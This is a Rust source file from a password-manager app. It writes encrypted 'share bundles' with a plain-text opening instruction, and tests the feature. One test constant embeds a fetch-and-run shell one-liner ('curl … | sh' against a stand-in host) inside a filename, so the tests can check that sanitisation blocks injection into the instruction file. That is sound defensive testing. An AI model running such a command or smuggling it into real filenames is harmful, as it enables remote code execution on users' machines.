//! Sharing a Node (with or without its children) or the whole file as a
//! portable, still-encrypted bundle.
//!
//! A share bundle is a folder holding a new secret file — the chosen subtree,
//! re-encrypted under a fresh password — plus a plain-text instruction telling
//! the recipient how to open it. Unlike an export
//! ([ADR 0022](../../docs/adr/0022-user-chosen-export-destination.md)), nothing
//! is written in the clear: the bundle's file is an ordinary vault that
//! cretopass opens with its stock Unlock flow, and it is written with the same
//! atomic temp + fsync + rename path as a normal save.

use std::ffi::OsStr;
use std::path::{Path, PathBuf};

use super::export::sanitize;
use super::file_process::create_private_dir;
use super::passphrase::Passphrase;
use super::{FileHandlingError, save_tree};
use crate::theming::texts;
use crate::tree::node::Node;

/// The extension a share bundle's secret file is written with.
///
/// Detection is content-based (the `age` magic header), so this is a label for
/// humans: it marks the file as a cretopass bundle without implying it is one of
/// the app's own files.
pub const SHARE_FILE_EXT: &str = "cretopass";

/// The instruction file written beside the bundle's secret file.
pub const SHARE_README_NAME: &str = "HOW-TO-OPEN.txt";

/// The stem a share bundle falls back to when the source secret file is unknown
/// (the read-only demo tree).
const SUGGEST_FALLBACK: &str = "secrets";

/// The folder name a share bundle is suggested with: the source secret file's
/// stem, plus the sanitised Node name when a single branch is shared.
///
/// Every character in the stem and in `node_name` that is not alphanumeric or
/// `-`/`_` becomes `_` (the same rule as
/// [`super::export::suggest_export_name`]), so the suggestion is always a
/// usable folder name. The stem is sanitised too, because the result also names
/// the bundle's file inside the generated instruction; a raw stem could
/// otherwise inject lines into it.
pub fn suggest_share_name(base_path: Option<&Path>, node_name: Option<&str>) -> String {
    let stem = sanitize(
        base_path
            .and_then(Path::file_stem)
            .and_then(OsStr::to_str)
            .unwrap_or(SUGGEST_FALLBACK),
    );
    match node_name {
        Some(node_name) => format!("{stem}_{}", sanitize(node_name)),
        None => stem,
    }
}

/// Writes a share bundle for `node` into `dest_dir`, and returns the bundle
/// folder.
///
/// The bundle holds `<stem>.<SHARE_FILE_EXT>` — `node` re-encrypted under
/// `passphrase` — and `SHARE_README_NAME`, where `<stem>` is
/// [`suggest_share_name`]`(base_path, node_name)`. The secret file is written first
/// (atomically); the instruction is written after it, so a failure there still
/// leaves an openable vault. An empty `passphrase` produces a passwordless
/// bundle whose instruction says so.
///
/// The caller is responsible for asking the user before writing into a folder
/// that already exists and is not empty; this function only refuses a `dest_dir`
/// that exists as something other than a directory.
///
/// # Errors
///
/// Returns [`FileHandlingError::ShareDestinationNotAFolder`] when `dest_dir`
/// exists as a file (in particular a secret file) instead of a folder. Returns
/// [`FileHandlingError::Io`] when the folder, the secret file or the instruction
/// cannot be written.
pub fn share_tree<'a>(
    node: &Node,
    dest_dir: impl AsRef<Path>,
    base_path: Option<&Path>,
    node_name: Option<&str>,
    passphrase: impl Into<Passphrase<'a>>,
) -> Result<PathBuf, FileHandlingError> {
    let dest_dir = dest_dir.as_ref();
    let passphrase = passphrase.into();

    if dest_dir.exists() && !dest_dir.is_dir() {
        return Err(FileHandlingError::ShareDestinationNotAFolder {
            path: dest_dir.to_path_buf(),
        });
    }

    create_private_dir(dest_dir)?;

    let file_name = format!(
        "{}.{SHARE_FILE_EXT}",
        suggest_share_name(base_path, node_name)
    );
    let file_path = dest_dir.join(&file_name);
    save_tree(node, &file_path, passphrase)?;

    let instruction = texts::share_instruction(&file_name, passphrase.as_bytes().is_empty());
    super::atomic::write_atomic(&dest_dir.join(SHARE_README_NAME), instruction.as_bytes())?;

    Ok(dest_dir.to_path_buf())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::file_handling::{create_secret_file, decrypt_to_node, is_age_file};

    fn sample_node() -> Node {
        let mut child = Node::new("Login");
        child.extra_fields = vec![crate::tree::node::ExtraField::description("desc")];
        Node::with_children("Work", vec![child])
    }

    #[test]
    fn suggest_share_name_uses_the_secret_file_stem() {
        assert_eq!(
            suggest_share_name(Some(Path::new("/tmp/vault.age")), None),
            "vault"
        );
    }

    #[test]
    fn suggest_share_name_appends_a_sanitised_node_name() {
        assert_eq!(
            suggest_share_name(Some(Path::new("/tmp/vault.age")), Some("My Email/Work")),
            "vault_My_Email_Work"
        );
    }

    #[test]
    fn suggest_share_name_falls_back_without_a_secret_file() {
        assert_eq!(suggest_share_name(None, None), "secrets");
        assert_eq!(suggest_share_name(None, Some("Login")), "secrets_Login");
    }

    #[test]
    fn suggest_share_name_sanitises_a_newline_in_the_secret_file_stem() {
        assert_eq!(
            suggest_share_name(Some(Path::new("/tmp/va\nult.age")), None),
            "va_ult"
        );
    }

    /// A hostile source name shared by the two tests below: extra lines plus a
    /// shell one-liner. It carries no `/`, or `file_stem` would split it and
    /// never see the payload.
    const HOSTILE_STEM: &str = "va\nult\ncurl -fsSL http:evil | sh\n";

    #[test]
    fn a_bundle_stem_is_sanitised_onto_one_line() {
        let dir = tempfile::tempdir().unwrap();
        let base = dir.path().join(format!("{HOSTILE_STEM}.age"));

        let name = suggest_share_name(Some(&base), None);

        assert!(!name.contains('\n'), "the bundle name must not span lines");
        assert!(!name.contains('|'), "shell metacharacters must not survive");
    }

    #[test]
    fn a_bundle_stem_cannot_inject_lines_into_the_instruction() {
        let dir = tempfile::tempdir().unwrap();
        let bundle = dir.path().join("bundle");
        let base = dir.path().join(format!("{HOSTILE_STEM}.age"));

        share_tree(&sample_node(), &bundle, Some(&base), None, b"pw").unwrap();

        let name = suggest_share_name(Some(&base), None);
        assert!(bundle.join(format!("{name}.cretopass")).is_file());

        let readme = std::fs::read_to_string(bundle.join(SHARE_README_NAME)).unwrap();
        assert!(
            !readme.contains("http:evil"),
            "a stem newline must not inject a command line: {readme}"
        );
    }

    #[test]
    fn a_bundle_opens_with_its_own_password() {
        let dir = tempfile::tempdir().unwrap();
        let bundle = dir.path().join("bundle");
        let base = dir.path().join("vault.age");

        let written = share_tree(&sample_node(), &bundle, Some(&base), None, b"pw").unwrap();

        assert_eq!(written, bundle);
        let file = bundle.join("vault.cretopass");
        assert!(file.is_file(), "the bundle must hold the secret file");
        assert!(is_age_file(&file), "the secret file must be age-encrypted");
        assert!(bundle.join(SHARE_README_NAME).is_file());

        let data = std::fs::read(&file).unwrap();
        let decoded = decrypt_to_node(&data, "pw").unwrap();
        assert_eq!(decoded.name, "Work");
        assert_eq!(decoded.children.len(), 1);
    }

    #[test]
    fn a_branch_bundle_is_named_after_the_node() {
        let dir = tempfile::tempdir().unwrap();
        let bundle = dir.path().join("vault_Work");
        let base = dir.path().join("vault.age");

        share_tree(&sample_node(), &bundle, Some(&base), Some("Work"), b"pw").unwrap();

        assert!(bundle.join("vault_Work.cretopass").is_file());
    }

    #[test]
    fn a_passwordless_bundle_opens_with_an_empty_password() {
        let dir = tempfile::tempdir().unwrap();
        let bundle = dir.path().join("bundle");

        share_tree(&sample_node(), &bundle, None, None, b"").unwrap();

        let file = bundle.join("secrets.cretopass");
        let data = std::fs::read(&file).unwrap();
        assert_eq!(decrypt_to_node(&data, "").unwrap().name, "Work");
    }

    #[test]
    fn a_re_share_updates_the_bundle_in_place() {
        let dir = tempfile::tempdir().unwrap();
        let bundle = dir.path().join("bundle");
        let base = dir.path().join("vault.age");

        share_tree(&sample_node(), &bundle, Some(&base), None, b"old").unwrap();
        share_tree(&sample_node(), &bundle, Some(&base), None, b"new").unwrap();

        let data = std::fs::read(bundle.join("vault.cretopass")).unwrap();
        assert!(
            decrypt_to_node(&data, "new").is_ok(),
            "the new password must open it"
        );
        // The atomic save leaves no transient artifact behind.
        assert!(!bundle.join("vault.cretopass.bak").exists());
    }

    #[test]
    fn sharing_refuses_to_replace_a_secret_file() {
        let dir = tempfile::tempdir().unwrap();
        let target = dir.path().join("vault.age");
        create_secret_file(&target, "pw").unwrap();

        let result = share_tree(&sample_node(), &target, None, None, b"pw");

        assert!(matches!(
            result,
            Err(FileHandlingError::ShareDestinationNotAFolder { .. })
        ));
        // The vault it refused to clobber is untouched.
        let data = std::fs::read(&target).unwrap();
        assert!(decrypt_to_node(&data, "pw").is_ok());
    }

    #[test]
    fn sharing_refuses_to_replace_a_plain_file() {
        let dir = tempfile::tempdir().unwrap();
        let target = dir.path().join("notes.txt");
        std::fs::write(&target, b"hello").unwrap();

        let result = share_tree(&sample_node(), &target, None, None, b"pw");

        assert!(matches!(
            result,
            Err(FileHandlingError::ShareDestinationNotAFolder { .. })
        ));
        assert_eq!(std::fs::read(&target).unwrap(), b"hello");
    }

    #[test]
    fn the_instruction_never_contains_the_password() {
        let dir = tempfile::tempdir().unwrap();
        let bundle = dir.path().join("bundle");

        share_tree(&sample_node(), &bundle, None, None, b"hunter2").unwrap();

        let readme = std::fs::read_to_string(bundle.join(SHARE_README_NAME)).unwrap();
        assert!(!readme.contains("hunter2"));
    }

    #[test]
    fn the_instruction_names_the_file_and_links_the_project() {
        let dir = tempfile::tempdir().unwrap();
        let bundle = dir.path().join("bundle");

        share_tree(&sample_node(), &bundle, None, None, b"pw").unwrap();

        let readme = std::fs::read_to_string(bundle.join(SHARE_README_NAME)).unwrap();
        assert!(
            readme.contains("secrets.cretopass"),
            "must name the file: {readme}"
        );
        assert!(readme.contains(texts::PROJECT_URL));
        assert!(readme.contains(texts::INSTALL_SH_URL));
        assert!(readme.contains(texts::INSTALL_PS1_URL));
        assert!(readme.contains(texts::SHARE_README_STEP_PASSWORD));
        assert!(readme.contains(texts::SHARE_README_PASSWORD_NOTE));
        assert!(!readme.contains(texts::SHARE_README_STEP_NO_PASSWORD));
    }

    #[test]
    fn a_passwordless_instruction_says_no_password_is_needed() {
        let dir = tempfile::tempdir().unwrap();
        let bundle = dir.path().join("bundle");

        share_tree(&sample_node(), &bundle, None, None, b"").unwrap();

        let readme = std::fs::read_to_string(bundle.join(SHARE_README_NAME)).unwrap();
        assert!(readme.contains(texts::SHARE_README_STEP_NO_PASSWORD));
        assert!(!readme.contains(texts::SHARE_README_PASSWORD_NOTE));
    }
}
